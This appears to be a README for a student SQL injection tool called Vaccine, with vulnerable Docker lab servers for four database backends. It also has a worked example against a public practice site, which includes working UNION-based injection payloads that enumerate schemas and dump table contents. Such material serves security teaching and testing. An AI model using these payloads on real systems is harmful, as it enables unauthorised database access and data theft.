# Vaccine Project

<br>

- [[Main Tool]](#main-tool)
- [[Tests]](#tests)
	- [[MySQL]](#mysql)
	- [[MariaDB]](#mariadb)
	- [[PostgreSQL]](#postgresql)
	- [[SQLite]](#sqlite)
	- [[Exploitation]](#exploitation)

<br><br>

---

<br><br>


### Main Tool

```
42-Cybersecurity - Vaccine | SQL Injector

Auto SQL Injector supporting:
  - Servers: MySQL, MariaDB, PostgreSQL, SQLite;
  - Injections: Stacked, Union, Blind, Boolean;
  - Auto-adapt limit: Yes

Given an url, it will search for every form and try to send
 suspicious payloads to find the injectable fields.
Once the fields discovered, try to exploit them using the
 configured injection.json file.

NOTE: Some server can be more "tricky" to inject. For these
 servers, you need to edit (use a custom) injection.json file.

Usage: ./vaccine [FLAGS] <URL>

Flags:
  -o <file>,             --out <file>                  Dump the data in an output file ('w' mode). Default: ./out/out_%Y-%m-%d_%H-%M-%S_%f.json
  -d <file>,             --logfile <file>              Dump the logs in a log file ('a' mode). Default: ./logs/log_%Y-%m-%d.log
  -c,                    --colored                     Enable ANSI colored output in the log file.
  -X <method>,           --method <method>             HTTP Method (either GET or POST). Default: GET
  -H <name=value[;...]>, --headers <name=value[;...]>  HTTP Headers
  -i <file>,             --injections <file>           List of injection payloads to use. Default: ./payloads/injections-1.0.json
  -m <mode>,             --mode <mode>                 Injection type (stacked, union, blind-bool or all). Default: all
  -v,                    --verbose                     Enable logging of sent payloads
  -h,                    --help                        Print this help message


Example:
  ./vaccine http://localhost:3000/login
  ./vaccine http://testphp.vulnweb.com/search.php -v -m union -i injection-x.x.json -H 'User-Agent=Vaccine;Accept=*/*'

Credits: ysabik (https://github.com/Luzog78)
```

Quick run of the Vaccine tool:
```sh
make && ./vaccine 'http://localhost:3000/login'
```
```sh
make && ./vaccine 'http://localhost:3000/search'
```

To get some info on the usage, run:
```sh
make && ./vaccine -h
```

<br><br>

---

<br><br>


### Test servers

This project constains a battery of testing vulnerable servers. <br>
They are nearly identical, except for the database backend used.

They are docker-compose instances composed at least of:
- A makefile to easily build, run and debug;
- A docker instance of a database server prepopulated with some sample data;
- A docker instance of a visualizer (phpMyAdmin, pgAdmin, Adminer) to easily view the database content.
- And a docker instance of a web server running the vulnerable web application:
	- The web application is vulnerable to SQL Injection attacks.
	- It uses the framework express with the EJS lib to help render the frontend.
	- And it contains 3 simple pages:
		- A home page with nothing special;
		- A login page allowing users to log in;
		- A search page allowing users to search for items in the database.


#### MySQL

Start the MySQL test server and open the web application in your browser:
```sh
make -C test/mysql up open logs
```

Stop the MySQL test server and clean all the generated data:
```sh
make -C test/mysql fclean
```

To get some info on more useful commands, run:
```sh
make -C test/mysql help
```


#### MariaDB

Start the MariaDB test server and open the web application in your browser:
```sh
make -C test/mariadb up open logs
```

Stop the MariaDB test server and clean all the generated data:
```sh
make -C test/mariadb fclean
```

To get some info on more useful commands, run:
```sh
make -C test/mariadb help
```


#### PostgreSQL

Start the PostgreSQL test server and open the web application in your browser:
```sh
make -C test/postgresql up open logs
```

Stop the PostgreSQL test server and clean all the generated data:
```sh
make -C test/postgresql fclean
```

To get some info on more useful commands, run:
```sh
make -C test/postgresql help
```


#### SQLite

Start the SQLite test server and open the web application in your browser:
```sh
make -C test/sqlite up open logs
```

Stop the SQLite test server and clean all the generated data:
```sh
make -C test/sqlite fclean
```

To get some info on more useful commands, run:
```sh
make -C test/sqlite help
```

<br><br>

#### Exploitation

To exploit theses apps, here is some quick examples of vaccine usage:

Stacked exploitation:
```sh
./vaccine http://localhost:3000/search -m stacked
```

Union exploitation:
```sh
./vaccine http://localhost:3000/login -m union
```

Blind & Boolean exploitation:
```sh
./vaccine http://localhost:3000/search -m blind-bool
./vaccine http://localhost:3000/login -m blind-bool
```

<br><br>

---

<br><br>


### Real World Usage

You can test the Vaccine tool on real world vulnerable web applications such as [http://testphp.vulnweb.com/](http://testphp.vulnweb.com/).

In the [/search.php](http://testphp.vulnweb.com/search.php) page, there is a form. But the injection is not basic: we have to find out what the original code looks like to be able to configure correctly the injection.json file.

After several attempts, we can deduce the formula looks somthing like that:
```php
db.query(
	'SELECT * FROM some_table WHERE (() AND ());'
)
```

So, to not create sql syntax errors, we need to close the parentheses first.
Instead of looking like this:
```
' UNION SELECT {offset_bef} CONCAT('{delimiter}', DATABASE(), '{delimiter}') {offset_aft}-- -
```
The payloads will more be like that:
```
+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', DATABASE(), '{delimiter}') {offset_aft}-- -
```

Here is the updated `injection.json` (`injections.exploits.mysql`):
```json
"union": {
	"min_offset": 10,
	"max_offset": 15,
	"database": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', DATABASE(), '{delimiter}') {offset_aft}-- -",
	"version": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', VERSION(), '{delimiter}') {offset_aft}-- -",
	"user": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', USER(), '{delimiter}') {offset_aft}-- -",
	"databases": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', schema_name, '{delimiter}') {offset_aft} FROM information_schema.schemata LIMIT {limit} OFFSET {offset}-- -",
	"tables": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', table_name, '{delimiter}') {offset_aft} FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit} OFFSET {offset}-- -",
	"columns": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', column_name, '{delimiter}') {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
	"dump": "+','')) UNION SELECT {offset_bef} CONCAT('{delimiter}', {column}, '{delimiter}') {offset_aft} FROM {database}.{table} LIMIT {limit} OFFSET {offset}-- -"
}
```

Then, we can execute the Vaccine tool:
```sh
./vaccine http://testphp.vulnweb.com/search.php -m union -i payloads/injections.json
```

Congrat! You have successfully hacked a real vulnerable web application! 🎉

<br><br>

---

<br><br>

###### _Author: [Luzog78](https://github.com/Luzog78) - [ysabik](https://profile.intra.42.fr/users/ysabik)_
